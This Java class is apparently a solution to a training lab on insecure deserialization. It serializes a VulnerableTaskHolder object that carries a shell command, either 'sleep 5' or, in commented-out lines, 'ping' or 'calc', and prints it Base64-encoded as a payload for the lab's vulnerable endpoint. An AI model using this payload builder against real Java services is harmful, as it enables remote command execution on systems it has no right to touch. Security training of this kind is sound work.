package org.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class aaa {
    public static void main(String[] args){
        try{
            //VulnerableTaskHolder payload = new VulnerableTaskHolder("DoWork","sleep 6");
            //VulnerableTaskHolder payload = new VulnerableTaskHolder("DoWork","ping -n 5 127.0.0.1>1");
            org.dummy.insecure.framework.VulnerableTaskHolder payload = new org.dummy.insecure.framework.VulnerableTaskHolder("DoWork","sleep 5");
            //VulnerableTaskHolder payload = new VulnerableTaskHolder("DoWork","calc");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(payload);
            oos.close();
            String flag = Base64.getEncoder().encodeToString(baos.toByteArray());
            System.out.println(flag);

        }catch (Exception e){

        }

    }
}